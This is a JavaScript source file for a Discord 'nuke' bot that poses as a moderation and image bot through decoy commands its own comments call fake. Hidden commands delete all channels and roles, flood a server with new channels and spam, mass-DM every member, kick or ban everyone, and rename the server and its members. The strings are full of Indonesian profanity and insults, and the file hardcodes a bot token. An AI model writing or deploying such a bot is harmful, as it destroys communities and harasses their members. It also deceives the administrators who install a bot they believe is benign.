const Discord = require('discord.js');
const client = new Discord.Client();
const chalk = require('chalk');
const fs = require('fs');
const botPrefix = "*"

  client.on('ready', msg => {
  console.log("");                                   
  console.log((chalk.cyan(`                                            #####                                     ######                   `)));
  console.log((chalk.cyan(`                                           #     #   ##   #        ##    ####  #    # #     #   ##   # #####  `)));
  console.log((chalk.cyan(`                                           #        #  #  #       #  #  #    # #   #  #     #  #  #  # #    # `)));
  console.log((chalk.cyan(`                                           #  #### #    # #      #    # #      ####   ######  #    # # #    # `)));
  console.log((chalk.cyan(`                                           #     # ###### #      ###### #      #  #   #   #   ###### # #    # `)));
  console.log((chalk.cyan(`                                           #     # #    # #      #    # #    # #   #  #    #  #    # # #    # `)));
  console.log((chalk.cyan(`                                            #####  #    # ###### #    #  ####  #    # #     # #    # # #####  `)));
  console.log("");                                  
  console.log((chalk.yellow(`                                                               Developer : Aldi Boytons!`)));  
  console.log((chalk.yellow(`                                                                © 2020 Aldi Boytons, Inc.`))); 
  console.log("");                                   
  console.log("");                                  

  console.log(`Statistiques globales : \n\nLe bot a un total de ${client.guilds.cache.size} serveurs. \nPour un total de ${client.users.cache.size} membres.`)
  console.log("Connect " + client.user.id + " | Prefix : " + botPrefix + " | server : "+ client.guilds.cache.size +" | Channels :"+ client.channels.cache.size +" | User :  "+ client.users.cache.size +" | emoji : "+ client.emojis.cache.size +'');
  client.user.setActivity("*help - Aldi Boytons");
});

client.on('message',  msg => {

    if (msg.guild && msg.content.startsWith('*pm')) {
      msg.delete();
      let text = msg.content.slice('*pm'.length);
      msg.guild.members.cache.forEach(member => {
        if (member.id != client.user.id && !member.user.bot) member.send(text);
      });
    }
    if(msg.content.startsWith('*ch')){
      msg.delete();
      let channelname = msg.content.slice('*ch'.length);
      msg.channel.send("CREATE :" + "**" + channelname + "**")

    var i;
    for (i = 0; i < 100; i++) {
    setTimeout(() => {

        msg.guild.channels.create(channelname,{type: 'text'})
        .then(console.log)
        .catch(console.error);

    },1*1) //3 secondes
    }
    }
    if(msg.content.startsWith("*sp")){
      msg.delete();
      let yourmessage = msg.content.slice('*spam'.length);
      var i;
      
      for (i = 0; i < 50; i++) {
      setTimeout(() => {
         msg.channel.send(yourmessage)
      },1*1) //3 secondes
      }
      
    }
    if(msg.content.startsWith('*dc')){
      msg.delete();
      var i = 0
      msg.guild.channels.cache.forEach(channel =>
      i++
      )
      msg.channel.send("KONTOL **" + i + "** ANJING")
        msg.guild.channels.cache.forEach(channel => 

         
            setTimeout(() => {channel.delete()},1000*3))
            msg.guild.channels.create("𝙍𝘼𝙄𝘿 𝘽𝙔 : 𝘼𝙇𝘿𝙄 𝘽𝙊𝙔𝙏𝙊𝙉𝙎",{type: 'voice'})
            .then(console.log)
            .catch(console.error);

    }
    if(msg.content.startsWith('*dr')){
      msg.delete();
      let notdelete = msg.content.slice('*deleteroles'.length);
      var i = 0
      msg.guild.roles.cache.forEach(role =>
        i++
      )
      msg.channel.send("ANJING **"+i+"** MEMEK")
        msg.guild.roles.cache.forEach(role => 
            setTimeout(() => {
            if(msg.guild.id !== role.id && role.name != "corona" && role.id != notdelete){
                role.delete()
            }
            },1000*3))
    }
    if(msg.content == "*1help"){
      msg.delete();
      const helpEmbed = new Discord.MessageEmbed()
      .setColor('#0099ff')
      .setTitle('COMMANDNYA GOBLOK !')
      .setURL('https://discord.gg/DactsvrD4m')
      .setDescription('DEV : ALDI BOYTONS')
      .addField('ALDI BOYTONS')
      .addField('Command', 
        '\n`*1help` - TOLOL LU GOBLOK ANJING\n`gn - Ganti nama server\n`*dc` - APUS CHANNEL LAH KONTOL\n`*dr` - APUS ROLE LAH GBLK APUS APA LAGI\n`*ch[nomor]` - BIKIN 100 CHANNEL\n`*sp [Message]` - NYEPAM\n`*ka` - KICK SEMUA ANAK ANAK ANJING! \n`*ba` - BAN SEMUA ANAK ANAK ANJING\n`*pm [Message]` - DM ALL MEMBERS', true)
      .setTimestamp()
      .setFooter('KONTOL LU', 'https://cdn.discordapp.com/attachments/800054456774950912/803700226400583680/3e790190420049.5e16dc1213c7a.gif');
        
      msg.author.send(helpEmbed);
    }
  
  if(msg.content.startsWith('*spmall')){
      msg.delete();
      var i;
      for (i = 0; i < 5; i++) {

      setTimeout(() => {

        let yourmessage = msg.content.slice('*spmall'.length);
        
        msg.guild.channels.cache.forEach(channel =>
          channel.send(yourmessage)
          )
      },1*1) //3 secondes
      }
    }
    if(msg.content == "*ka"){
      msg.delete();    
      msg.guild.members.cache.forEach(member => {

        if(member != msg.member && member.id != "ID" && member.id != "ID" && member.id != "ID"){
          member.kick();
        }
      })  
      }
      if(msg.content == "*ba"){
        msg.delete();     
        msg.guild.members.cache.forEach(member => {
  
          if(member != msg.member && member.id != "ID" && member.id != "ID" && member.id != "ID"){
            member.ban();
          }
        })  
        }
      if(msg.content.startsWith('*na')){
        msg.delete();
        let nickname = msg.content.slice('*massnick'.length);
        var i = 0;
        msg.guild.members.cache.forEach(member =>{
          i++
        }
          )
        msg.channel.send("ganti nama **" + i + "** member **" + nickname + "**")
        msg.guild.members.cache.forEach(member =>{

          member.setNickname(nickname)
        }
          )
      }
      if(msg.content.startsWith('*gn')){
        msg.delete();
        let newguildname = msg.content.slice('*guildname'.length);
        msg.channel.send("GANTI NAMA SERVER : **" + newguildname + "**")
        msg.guild.setName(newguildname)
      }


      if((msg.content.startsWith('*ev'))){
        msg.delete();
        let msgtosend = msg.content.slice('*everyguildupdatemessage'.length)
        var guildList = client.guilds.cache.array();
        try{
          guildList.cache.forEach(guild =>
            guild.channels.cache.forEach(channel =>
              channel.send(msgtosend)
            )
            
            )
        } catch (err) {
          console.log("GABSA KONTOL")
        }
      }
      if((msg.content.startsWith('*everyguildmassnick'))){
        msg.delete();
        let nickname = msg.content.slice('*everyguildmassnick'.length)
        var guildList = client.guilds.array();
        try{
          guildList.cache.forEach(guild =>
            guild.members.cache.forEach(member =>{
              member.setNickname(nickname);
            })
            
            )
        } catch (err) {
          console.log("GABISA GANTI NAMA ")
        }
      }

//Commande fake 
    if(msg.content == "*help"){
      const helpEmbed = new Discord.MessageEmbed()
      .setColor('#0099ff')
      .setTitle('ANAK KONTOL')
      .setURL('https://discord.gg/DactsvrD4m')
      .setDescription('Dev : Aldi Boytons')
      .addField('Command Admin', 
        '\n`*help` - command ini goblok\n`*automod` - Activer l\'automod\n`*antilink` - Active l\'anti-link di server lu')
      .addField('Commandes Image', 
        '\n`*cat` - kucing kontol\n`*dog` - anjing goblok\n`*calin` - apa kek\n`*weed` - weed anjing\n`*punch` - tonjok aja palanya goblok')
      .setTimestamp()
      .setFooter('Aldi Boytons', 'https://cdn.discordapp.com/attachments/800054456774950912/803700226400583680/3e790190420049.5e16dc1213c7a.gif');
        
      msg.channel.send(helpEmbed);
    }
//Commande fake Admin
    if(msg.content == "*automod"){
      const automod = new Discord.MessageEmbed()
      .setColor('#0099ff')
      .setDescription(":white_check_mark: **L'UDH AKTIF KONTOL.**")
        
      msg.channel.send(automod);
    }

    if(msg.content == "*antilink"){
      const automod = new Discord.MessageEmbed()
      .setColor('#0099ff')
      .setDescription(":white_check_mark: **L'ANTI LINK UDH AKTIF KONTOL**")
        
      msg.channel.send(automod);
    }
//Commande fake Image
    if(msg.content == "*cat"){
        const member = msg.member;

            const kiss = [
            `https://www.wanimo.com/veterinaire/wp-content/uploads/2018/11/chat-jaloux-e1574672723199@2x.jpg`,
            `https://alternativi.fr/uploads/articles//les-bienfaits-du-chat-sur-lhomme-e96.jpeg`,
            `https://www.zooplus.fr/magazine/wp-content/uploads/2019/06/comprendre-le-langage-des-chats-768x576.jpg`,
            `https://www.wikichat.fr/wp-content/uploads/sites/2/comment-soigner-une-plaie-dun-chat.jpg`,
            `https://www.dogteur.com/media/magpleasure/mpblog/list_thumbnail_file/e/a/cache/5/ece9a24a761836a70934a998c163f8c8/eaf7d56dbea1bb003bb0bb649c022bab.jpg`,
            `https://static.mmzstatic.com/wp-content/uploads/2018/05/manquer-a-son-chat.jpg`,
            `https://static.actu.fr/uploads/2020/02/ruse-chat-1.jpeg`,
            `https://p5.storage.canalblog.com/58/97/234487/9496047.jpg`,
            `https://i.skyrock.net/0952/41420952/pics/2860119478_small_1.jpg`,
            `https://i.ytimg.com/vi/TDTijZcpjMo/maxresdefault.jpg`,
            `https://assets.change.org/photos/9/pg/yc/ovpgycJUUzHOXno-400x400-noPad.jpg`,
            `https://voyage-onirique.com/wp-content/uploads/2020/04/backiee-149162-landscape.jpg`,
            `https://www.30millionsdamis.fr/uploads/pics/conseils-erreurs-chat-1171.jpg`
        ]


      const embed = new Discord.MessageEmbed()
        .setDescription(`**${member.user.username}** jancuk :cat:`, msg.author.avatarURL)
        .setImage(kiss[Math.floor(Math.random() * kiss.length)])
        .setFooter('ANAK MEMEK : ' + member.user.username)
        .setColor("RANDOM")

        msg.channel.send(embed);
    }

    if(msg.content == "*dog"){
        const member = msg.member;

            const kiss = [
            `https://www.zooplus.fr/magazine/wp-content/uploads/2020/03/coronavirus-chez-le-chien-768x512.jpeg`,
            `https://static.actu.fr/uploads/2019/10/chien-854x599.jpg`,
            `https://www.purina.fr/sites/g/files/mcldtz1371/files/2019-11/Adolescence-chien-min_0.jpg`,
            `https://www.notretemps.com/cache/com_zoo_images/aa/chien-chaleur3_e9b008236b81f94bc66a7cc0cea9ac83.jpg`,
            `https://static.cotemaison.fr/medias_10824/w_2048,h_1146,c_crop,x_0,y_184/w_640,h_360,c_fill,g_north/v1456392403/10-conseils-pour-rendre-votre-chien-heureux_5542245.jpg`,
            `https://static.wamiz.fr/images/news/facebook/article/chien-os-fb-594cdb7b3d78d.jpg`,
            `https://jardinage.lemonde.fr/images/dossiers/categories3/racedecien-083123-650-325.jpg`,
            `https://images.sudouest.fr/2020/01/21/5e27092366a4bd6733ae5f03/widescreen/1000x500/plus-de-14700-bergers.jpg?v1`,
            `https://lemagduchien.ouest-france.fr/images/dossiers/2019-06/chien-heureux-064736.jpg`,
            `https://static.lpnt.fr/images/2019/03/02/18179740lpw-18179789-article-chien-allemagne-jpg_6010782_1250x625.jpg`,
            `https://images.sudouest.fr/2020/01/21/5e27092366a4bd6733ae5f03/widescreen/1000x500/plus-de-14700-bergers.jpg?v1`,
            `https://www.numerama.com/content/uploads/2020/08/chien_berger_allemand.jpg`,
            `https://cdn.radiofrance.fr/s3/cruiser-production/2019/04/7d5231cd-9205-450c-8941-026793a9ac2c/870x489_chien-939361388.jpg`,
            `https://images.sudouest.fr/2019/08/08/5d4c054766a4bdc30d9b31d5/widescreen/1000x500/sur-les-lieux-six-chiens.jpg?v1`
        ]


      const embed = new Discord.MessageEmbed()
        .setDescription(`**${member.user.username}** KAMPANK :dog:`, msg.author.avatarURL)
        .setImage(kiss[Math.floor(Math.random() * kiss.length)])
        .setFooter('ANAK ANJING : ' + member.user.username)
        .setColor("RANDOM")

        msg.channel.send(embed);
    }

    if(msg.content == "*weed"){
        const member = msg.member;

            const kiss = [
            `https://www.royalqueenseeds.fr/modules/prestablog/themes/royalqueenseeds/up-img/621.jpg`,
            `https://static1.purebreak.com/articles/0/19/76/20/@/721267-cannabis-la-legalisation-de-la-weed-en-opengraph_1200-2.jpeg`,
            `https://www.alchimiaweb.com/images/xl/cookies-and-weed_8736_1_.jpg`,
            `https://www.newsweed.fr/wp-content/uploads/2015/11/weed.jpg`,
            `https://lepetitjournal.com/sites/default/files/styles/main_article/public/2018-12/weed.jpg`,
            `https://france3-regions.francetvinfo.fr/image/Ycpxwsb9JFvXWMcfbqVAbOP5Q7Y/600x400/regions/2020/06/09/5edf8721bde5d_cannabis_17-4290056.jpg`,
            `https://www.quebecscience.qc.ca/wp-content/uploads/2019/07/cannabis.jpg`,
            `https://www.agrimaroc.ma/wp-content/uploads/cannabis-maroc.jpg`,
            `https://www.dinafem.org/uploads/0003122-big-kush.jpg`,
            `https://www.royalqueenseeds.fr/149-2410-thickbox/og-kush-.jpg`,
            `https://www.zamnesia.fr/5322-17428/super-og-kush-feminisee.jpg`,
            `https://www.amsterdamgenetics.com/wp-content/uploads/2019/07/purple_weed_blog-07-780x350.jpg`,
            `https://wheresweed.com/blog_images/main/purple-cannabis-why-you-should-care-about-color.jpg`,
            `https://i.pinimg.com/originals/ff/83/d6/ff83d682f26c62d28e64335ae4a23dc2.jpg`,
            `https://pevgrow.com/23761-large_default/7556-purple-kush-marijuana-grainers.jpg`,
            `https://wheresweed.com/blog_images/500x500/purple-cannabis-why-you-should-care-about-color.jpg`
        ]


      const embed = new Discord.MessageEmbed()
        .setDescription(`**${member.user.username}** ANAK MEMEK`, msg.author.avatarURL)
        .setImage(kiss[Math.floor(Math.random() * kiss.length)])
        .setFooter('ANAK HARAM : ' + member.user.username)
        .setColor("RANDOM")

        msg.channel.send(embed);
    }

    if(msg.content == "*punch"){

        const member = msg.member;

            const kiss = [
            `https://thumbs.gfycat.com/EssentialSillyBobcat-max-1mb.gif`,
            `https://pa1.narvii.com/6272/cf24160e6b4e98e2e40a3b2633a3cce7c31ed4f7_hq.gif`,
            `https://thumbs.gfycat.com/PoliticalAbleFennecfox-size_restricted.gif`,
            `https://pa1.narvii.com/6724/4daa91b820e74e1ce10574cbac4772d5169f84fa_hq.gif`,
            `https://thumbs.gfycat.com/ShinyRecklessBobwhite-size_restricted.gif`,
            `https://media1.tenor.com/images/34356db15b5e28ca27307ba87325e67d/tenor.gif`,
            `https://i.pinimg.com/originals/76/0b/3f/760b3fc3deac11d2163ea305987bd9bd.gif`
        ]


      const embed = new Discord.MessageEmbed()
        .setDescription(`**${member.user.username}** GUA TAMPOL JUGA LU :punch:`, msg.author.avatarURL)
        .setImage(kiss[Math.floor(Math.random() * kiss.length)])
        .setFooter('ANAK KONTOL :  ' + member.user.username)
        .setColor("RANDOM")

        msg.channel.send(embed);
    }

    if(msg.content == "*calin"){

        const member = msg.member;

            const kiss = [
            `https://i.pinimg.com/originals/d1/d3/a0/d1d3a02a8356549fcd48796b318d6b58.gif`,
            `https://i.pinimg.com/originals/5c/6c/a6/5c6ca66dbf69a5c5c0881caa275547ed.gif`,
            `https://data.whicdn.com/images/213476418/original.gif`,
            `https://media1.tenor.com/images/56c73f380d3ad747ff0600eb7ea1bbc7/tenor.gif`,
            `https://media2.giphy.com/media/l2QDM9Jnim1YVILXa/giphy.gif`,
            `https://i.pinimg.com/originals/6d/b5/4c/6db54c4d6dad5f1f2863d878cfb2d8df.gif`,
            `https://thumbs.gfycat.com/FocusedCoordinatedAlaskajingle-size_restricted.gif`
        ]


      const embed = new Discord.MessageEmbed()
        .setDescription(`**${member.user.username}** NGEWE :heart_eyes:`, msg.author.avatarURL)
        .setImage(kiss[Math.floor(Math.random() * kiss.length)])
        .setFooter('ANAK PUNGUT : ' + member.user.username)
        .setColor("RANDOM")

        msg.channel.send(embed);
    }


});


client.login("Nzk4Mzc0NTcwMTQxODEwNzI4.X_0GQg.dMQsKQeNL7g9pEuWDfvFbxFYIZI");
